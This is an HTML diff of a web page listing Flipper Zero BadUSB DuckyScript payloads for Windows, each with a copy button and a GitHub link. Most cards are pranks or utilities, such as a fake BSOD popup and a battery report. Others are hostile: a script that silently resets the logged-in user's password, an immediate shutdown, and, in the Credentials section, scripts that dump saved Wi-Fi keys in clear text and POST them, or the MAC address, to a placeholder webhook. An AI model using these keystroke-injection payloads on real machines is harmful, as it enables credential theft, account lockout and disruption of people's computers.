+        <div class="card-top"><span class="card-title">Rick Roll</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Rick Roll via browser</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> https://youtu.be/dQw4w9WgXcQ
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/RickRoll-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+
+      <article class="card">
+        <div class="card-top"><span class="card-title">Fake BSOD</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Fake BSOD popup</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> powershell -c <span class="str">"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('CRITICAL_PROCESS_DIED','Error',0,16)"</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/FakeBSOD-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+
+      <article class="card">
+        <div class="card-top"><span class="card-title">BAT File Prank</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM BAT prank — msg popup</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> cmd
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">600</span>
+<span class="kw">STRING</span> echo msg * Hacked > %tmp%\p.bat && %tmp%\p.bat
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/FileBAT-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+
+    </div>
+  </div>
+
+  <div class="cat-group" id="windows-Execution">
+    <div class="cat-head"><span class="cat-title">Execution</span><div class="cat-rule"></div><span class="cat-count">1</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Change User Password</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Execution</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Change User Password</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> cmd /k net user %USERNAME% NewPass123!
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/ChangePassword-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="windows-Utility">
+    <div class="cat-head"><span class="cat-title">Utility</span><div class="cat-rule"></div><span class="cat-count">5</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Check Battery</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Utility</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Check Battery Status</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> powershell -c <span class="str">"Get-WmiObject Win32_Battery | Select EstimatedChargeRemaining"</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/CheckBattery-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">Battery Report (BAT)</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Utility</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Battery Report via BAT</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> cmd
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">600</span>
+<span class="kw">STRING</span> powercfg /batteryreport /output <span class="str">"%userprofile%\battery.html"</span> && start <span class="str">"%userprofile%\battery.html"</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/BatteryReportBAT-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">Open Website</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Utility</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Open Website via Run</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> https://github.com/bst04/payloads_flipperZero
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/OpenWeb-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">Open Website (BAT)</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Utility</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Open Website via BAT</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> cmd
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">600</span>
+<span class="kw">STRING</span> echo start https://github.com/bst04 > %tmp%\o.bat && %tmp%\o.bat
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/OpenWebsiteBAT-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">PC Login</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Utility</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM PC Login automation</span>
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">SPACE</span>
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> YourPasswordHere
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/PCLogin-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="windows-General">
+    <div class="cat-head"><span class="cat-title">General</span><div class="cat-rule"></div><span class="cat-count">1</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Shutdown</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">General</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Shutdown immediately</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> shutdown /s /t 0
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/Shutdown-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="windows-Credentials">
+    <div class="cat-head"><span class="cat-title">Credentials</span><div class="cat-rule"></div><span class="cat-count">2</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Get MAC Address → Webhook</span><span class="pap-badge"><span class="dot dot-o"></span>Orange</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Credentials</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Get MAC Address → Webhook</span>
+<span class="cmt">REM ⚠ Replace WEBHOOK_URL</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> powershell -c <span class="str">"getmac | Invoke-RestMethod -Uri 'WEBHOOK_URL' -Method POST"</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/GetMacAddress-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">Get WiFi Keys → Webhook</span><span class="pap-badge"><span class="dot dot-o"></span>Orange</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Credentials</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Get WiFi Keys → Webhook</span>
+<span class="cmt">REM ⚠ Replace WEBHOOK_URL</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> powershell
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">800</span>
+<span class="kw">STRING</span> (netsh wlan show profiles) | % { netsh wlan show profile $_ key=clear } | Invoke-RestMethod -Uri <span class="str">'WEBHOOK_URL'</span> -Method POST
+<span class="kw">ENTER</span></code></pre>
+        </div>
